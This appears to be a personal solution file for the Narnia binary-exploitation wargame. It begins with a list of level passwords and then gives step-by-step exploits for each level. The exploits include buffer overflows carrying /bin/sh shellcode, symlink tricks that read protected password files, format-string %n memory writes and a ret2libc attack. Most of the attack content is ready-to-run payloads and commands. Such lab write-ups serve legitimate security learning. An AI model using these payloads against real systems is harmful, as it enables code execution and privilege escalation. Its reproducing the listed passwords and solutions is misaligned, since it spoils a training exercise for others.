narnia0 - narnia0
narnia1 - efeidiedae
narnia2 - nairiepecu
narnia3 - vaequeezee
narnia4 - thaenohtai
narnia5 - faimahchiy 
narnia6 - neezocaeng
narnia7 - ahkiaziphu
narnia8 - mohthuphog



solutions:

narnia0 -> narnia1
	OVERRIDING:
	The stack:
		1. puts values from the higest memory address down to the lowest memory address
	The scanf function:
		1. puts values from the lowest memory address up to the higest memory address
	
	In our case, val was stored in a higher memory address than buf (bacause it was declared before and thus pushed to the stack before "buf").
	Since the scanf function puts values from low to high, we are able to modify the value of VAL!

ENDIANITY:
	using the command (echo -e "aaaaaaaaaaaaaaaaaaaa\xde\xad\xbe\xef" | ./narnia0) didn't work and the output was:
		val = 0xefbeadde
	That is because the endianity is small, and the bytes are saved in reverse. 
	So in order to solve this, we use: (echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde" | ./narnia0)

USING CAT:
	the output is correct buf we don't get shell.
	use (echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde";cat) | ./narnia0 to fix this.
	or (python -c 'print "A" * 20 + "\xef\xbe\xad\xde") | ./narnia0
	That way:
		1. the echo command will be provided to the "scanf" command
		2. the cat command will be provided to the "shell" command

narnia1 -> narnia2
	setting EGG to "\xef\xbe\xad\xde" and running with gdb shows that the function ret() is
	now a function containing the opcode "0xdeadbeef".\
	so - setting EGG to a shellcode will give us a shell!
	solution:
		export EGG=$(echo -e "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89
			\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff
			\x2f\x62\x69\x6e\x2f\x73\x68\x4e")

narnia2 -> narnia3
	buffer overflow.
	script:
		As = 'A' * 128
		ebp = 'B' * 4
		eip = '\xf0\xd5\xff\xff' #ffffd5f0
		nops = '\x90' * 100
		shellcode = '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e'
		print As + ebp + eip + nops + shellcode
		
narnia3 -> narnia4
	concept:
		the program copies data from ifile to ofile.
		make ifile a sym link to /etc/narnia_pass/narnia4, and ofile some file in tmp.
	first try:
		insert ifile, then finish buffer with \x42\x08 (\x08 for backslash), then \X00 
		(for ending ifile string), then ofile.
		problem:
			cant insert null byte as input in bash :(
	second try:
		without null byte, ifile string contains ofile string in it. 
		make ofile some file in tmp, and make ifile a file with the same path in 
		the original path, like this:
			input = /tmp/bbbbb/tmp/bbbbb/ans = symlink
			output = /tmp/bbbbb/ans
			$(python -c 'print "/tmp/bbbbb" + "\x42\x08" * 11 + "/tmp/bbbbb/ans"')
		
		problem:
			the \x08 did some problems
	solution:
		make the base folder a bigger one! to cover all the 32 bytes:
			input_file: /tmp/blaAAAAAAAAAAAAAAAAAAAAAAAA/tmp/blue/sym ==> a symlink to narnia4 pass
			output_file: /tmp/blue/sym ==> the file to write the data to 
			
			program_execution: /narnia/narnia3 /tmp/blaAAAAAAAAAAAAAAAAAAAAAAAA/tmp/blue/sym
			program_output: copied contents of /tmp/blaAAAAAAAAAAAAAAAAAAAAAAAA/tmp/blue/sym to a safer place... (/tmp/blue/sym)
		
narnia4 -> narnia5
	simple shellcode:
	payload.py:
		As = "A" * 264
		eip = "\x8c\xd5\xff\xff"
		NOPs = "\x90" * 100
		shell = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e"
		print As + eip + NOPs + shell
	
	/narnia/narnia4 $(python payload.py)


narnia5 -> narnia6:
	Before calling snprintf, The stack looks like this:
				HIGH VALUES
						|				.										|
						|				^										|
						|				|										|
						|              ARGV(?)									|
						|			   ARGC(?)									|
						|				eip										| 
						|				ebp										| ebp
						|				ebx										|
						|				i=1										| ebp - 0x8
						|				.										|
						|				.										|
						|				.										|
						|				.										|
						|				.										|
						|				.										|
						|				.										|
						|				^										|
						|				|										|
						|				|										|
						|				|										|
						|				|										|
						|		  start of buffer								| ebp - 0x48
						|	argv buffer address(param for snprintf)				| ebp - 0x4c
						|sizeof buffer = 0x40(=64)(param for snprintf)			| ebp - 0x50
						|start of buffer addrs = ebp - 0x48(param for snprintf) | ebp - 0x54
						|		return address after snprintf finish			| ebp - 0x58
						|														|
						|														|
				LOW VALUES
	
	The snprintf(char *str, size_t size, const char *format, ...) stack looks like this:
	
				HIGH VALUES
						|														|
						|format parameter? (this case - not a format parameter)	| ebp - 0x40(== data in buffer)
						|format parameter? (this case - not a format parameter)	| ebp - 0x44(== data in buffer)
						|format parameter? (this case - not a format parameter)	| ebp - 0x48(== start of buffer)
						|foramt string address (this case - argv buffer address)| ebp - 0x4c
						|				size (this case - 0x40=64)				| ebp - 0x50
						|	the str address (this case - buffer start addrs) 	| ebp - 0x54	
						|					return address						| ebp - 0x58	
						|														|	
						|														|
				LOW VALUES
				
	if we use format string (like %08x), the snprintf function will try to find the parameter on the stack.
	The function thinks that the parameter is at locaion "ebp - 0x48", because if there was an argument, it was pushed
	before the argv buffer address, which means - in location "ebp - 0x48".
	So the argument's value will be the first byte of buffer! and if we use more foramt strings (like %08x), we can read
	more data up the stack!
	
	we can use two special format strings:
		1. %<n>u - prints unsigned int. if n!=0, pads <n> spaces before it
		2. %n - writes the number of bytes writen this far to an int pointer (int*) value.
	
	so - we can supply any unsinged int data to the "%u" foramt string, and supply the address of i to the %n foramt string, and that
	way we can overide i!
	So the first parameter will be the first 4 bytes of the buffer (can be AAAA or whatever), and the second parameter will be the next (higher) 4 bytes
	in buffer and will be the address of i.
	
	solution:
		$(python -c 'print "AAAA\xe0\xd6\xff\xff" + "%492u%n"')


narnia6 -> narnia7:
	user ret2libc.
	
	some facts:
	1. b1 can overide fg
	2. b2 can overider b1 and fg
	
	steps:
		1. system is a function which gets const char param and return int, just like fg! how conviniant!. "print system" in gdb returns 0xf7e4c850
		2. create link to bash named "/tmp/ohh\x50\xc8\xe4\xf7" (using: ln -s /bin/bash $(python -c 'print "/tmp/ohh\x50\xc8\xe4\xf7"'))
		3. use this file name as b1, or b2 with 8 As first (to fill the b2 buffer). That way - fg contains the address of system, and b1 contains the name of the 
		   link file ("/tmp/ohh\x50\xc8\xe4\xf7") - and we got shell! 
	
	solutions:
		1. /narnia/narnia6 $(python -c 'print "/tmp/ohh" + "\x50\xc8\xe4\xf7"') A
		2. /narnia/narnia6 A $(python -c 'print "A" * 8 + "/tmp/ohh" + "\x50\xc8\xe4\xf7"')
		
	

narnia7 -> narnia8:
	/narnia/narnia7 $(python -c 'print "\x18\xd6\xff\xffAAAA\x19\xd6\xff\xffAAAA\x1a\xd6\xff\xffAAAA\x1b\xd6\xff\xff" + "%8x%n%99u%n%125u%n%260u%n"')
	
	
narnia8 -> narnia9
failed try:
	As = "A" * 20
	blah = argv = "\x66\xd8\xff\xff"
	ebp = "\x8c\xd6\xff\xff"
	eip = "\x86\xd8\xff\xff"
	shell = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e"

	print As + blah + ebp + eip + shell
